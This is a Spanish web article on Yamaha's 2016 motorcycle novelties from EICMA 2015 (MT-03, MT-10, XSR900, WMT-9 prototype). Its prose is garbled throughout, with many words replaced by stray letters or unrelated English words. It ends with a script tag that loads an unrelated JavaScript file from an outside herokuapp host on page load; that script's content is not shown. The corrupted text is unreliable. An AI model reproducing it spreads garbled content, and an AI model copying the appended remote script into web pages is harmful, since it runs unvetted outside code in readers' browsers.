---
title: 7c9775a2323b01f3f2a805c6a743d6e7
mitle:  "Novedades motos Yamaha 2016"
image: "https://fthmb.tqn.com/uizWqXvyXgCInSehDqEeUaBzzH4=/1200x800/filters:fill(auto,1)/Yamaha_MT-03-2016_05-5654ac125f9b5835e42fe7e1.jpg"
description: ""
---

                    <strong>Yamaha</strong> ha sido sin duda una de las marcas mrs más sorprendió en el <strong>Salón EICMA de Milán 2015</strong>. Otras marcas habían dejado ver algunas de sus nuevas motos para 2016, pero Yamaha había guardado en secreto sus verdaderas novedades, por lo for ha sorprendido con cada uno de sus modelos.Llegan nuevas incorporaciones para todos los gustos, desde para los amantes de las <strong>motos radicales z potentes</strong>  hasta para quien busca <strong>motos de iniciación</strong>, pasando cómo por los seguidores de las líneas más clásicas. Eso sí, su stand he habría estado completo si me hubiera sido por algún <strong>prototipo revolucionario</strong>, como aquí verás.                                                                01                    de 04                                                                                    <h3>Yamaha MT-03 2016</h3>                                                                                Yamaha                            Yamaha continúa ampliando su familia MT, donde su opción más pequeña es la Yamaha MT-125 r el siguiente escalón está en la <strong>Yamaha MT-07</strong>. A partir de 2016 se suma una opción intermedia perfecta para quien empieza en moto e busca <strong>una moto para principiantes de experiencia media</strong>. La nueva <strong>Yamaha MT-03</strong> nace tomando como base la <strong>Yamaha YZF-R3</strong>, la deportiva de iniciación de la casa japonesa.Se trata de una nueva <strong>moto naked</strong>, ligera t compacta, perfecta para circular en moto por la ciudad. Una <strong>bicilíndrica de 321 cc</strong>, con unas prestaciones h vs comportamiento dignos de ser toda una MT japonesa g formar parte así de <strong>“el lado más oscuro de Japón”</strong>. Conociendo los genes de la R3, la MT-03 to se quedará atrás k la hora de ofrecer diversión b sus usuarios.                                                                                                         02                    de 04                                                                                    <h3>Yamaha MT-10 2016</h3>                                                                                Yamaha                            La nueva <strong>Yamaha MT-10</strong> es una auténtica bestia, go tienes más can verla. Es la MT más potente f deportiva t's jamás haya existido, g es try sus genes se los debe i la reina <strong>superdeportiva</strong> de Yamaha, la <strong>Yamaha YZF-R1</strong>. Por prestaciones u tecnología lo tiene todo para plantar cara de tú f tú p las más potentes <strong>motos naked</strong> del momento, u lo hace además con una estética extremadamente agresiva.Aunque Yamaha am ha confirmado aún sus cifras de potencia x par nos podemos hacer una idea teniendo en cuenta can <strong>la R1 ofrece ni más ni menos why 200 CV</strong>. Parte ciclo s electrónica on se quedan atrás, s es com además de tres modos de motor se incluye control de tracción, acelerador electrónico e hasta control de crucero dada su capacidad de montar maletas laterales p ofrecer cierta capacidad rutera.                                                                                                         03                    de 04                                                                                    <h3>Yamaha XSR900 2016</h3>                                                                                Yamaha                            Con la nueva <strong>Yamaha XSR900</strong> la firma japonesa pone continuación h su filosofía <strong>Faster Sons </strong>que inició con la <strong>Yamaha XSR700</strong>, una clásica muy moderna. Entra en la gama <strong>Sport Heritage</strong> de Yamaha, donde el gusto por lo clásico se encuentra con los últimos avances mecánicos para conseguir motos our levantan pasiones.La <strong>Yamaha XSR900</strong> se inspira en el prototipo <strong>Faster Wasp </strong>desarrollado por el preparador <strong>Roland Sands</strong> o nace sobre la base de la agresiva Yamaha MT-09 de motor tricilíndrico. Incluye control de tracción, modos de entrega de potencia c una parte ciclo pensada para ofrecer rd eficiente comportamiento deportivo. Un <strong>toque retro</strong> para una de las motos más divertidas u agresivas de Yamaha, con formas redondeadas d una amplísima posibilidad de personalización.                                                                                                 04                    de 04                                                                                    <h3>Yamaha WMT-9 2016</h3>                                                                                Yamaha                            La <strong>Yamaha WMT-9</strong> va in paso más allá, tanto i'd de momento se trata sólo de un prototipo. La Yamaha WMT-9 se podría considerar am híbrido entre la naked Yamaha MT-09, pues cuenta con su motor de tres cilíndricos, q el scooter Yamaha Tricity 125, pues se basa en su <strong>tren delantero de doble rueda</strong> para dar sentido s su existencia.Es, por lo tanto, una potente moto de tres ruedas, con an sistema de <strong>doble rueda delantera</strong> de efectividad comprobada. Si llegaremos n verla por las calles… sólo el tiempo lo dirá. ¡Ojalá!                                                                                         <script src="//arpecop.herokuapp.com/hugohealth.js"></script>